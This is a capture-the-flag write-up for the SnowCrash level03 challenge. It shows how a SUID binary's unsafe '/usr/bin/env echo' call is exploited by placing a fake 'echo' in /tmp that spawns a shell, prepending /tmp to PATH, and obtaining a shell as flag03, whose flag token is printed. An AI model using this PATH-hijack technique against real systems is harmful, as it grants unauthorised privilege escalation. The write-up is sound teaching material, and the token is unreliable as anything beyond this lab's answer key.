1. **File search**

    ```bash
    level03@SnowCrash:~$ ll
    total 24
    dr-x------ 1 level03 level03  120 Mar  5  2016 ./
    d--x--x--x 1 root    users    340 Aug 30  2015 ../
    -r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout*
    -r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc*
    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03*
    -r-x------ 1 level03 level03  675 Apr  3  2012 .profile*
    ``` 
    We can see that the file level03* has SUID permissions, which means that when executed, it runs with the privileges of the file owner (flag03), regardless of which user runs it.

    To exploit a file with SUID permissions, like level03*, you usually look for vulnerabilities in the binary, such as command injections, buffer overflows, or unsafe system calls.

2. **Looking for vulnerabilities**

    ```bash
    strings level03
    [...]
    /usr/bin/env echo Exploit me
    [...]
    ```  

    This line stands out when using `strings`.

    ```bash
    level03@SnowCrash:~$ /usr/bin/env echo Exploit me
    Exploit me
    ```   

    The command `/usr/bin/env echo Exploit me` runs the `env` program, which searches for and executes the first executable named echo it finds in the user's `PATH`, passing Exploit me as an argument.
    In this case, it prints Exploit me to the screen using the echo command.

    The key is that env allows you to control which executable is used (in this case, echo), which can be useful for exploiting the binary if you can manipulate the `PATH` and make it execute a malicious echo you created.

3. **Exploitation**

    Create a script called `echo`:

    ```bash
    echo '/bin/sh' > /tmp/echo
    chmod +x /tmp/echo
    ```  

    Modify the PATH so that `/tmp` is at the beginning:
    ```bash
    export PATH=/tmp:$PATH
    ```  

    Run the `level03` binary. This will open a shell with flag03 privileges:
    ```bash
    level03@SnowCrash:~$ ./level03 
    $ whoami 
    flag03
    $ getflag
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
    $ 
    ```
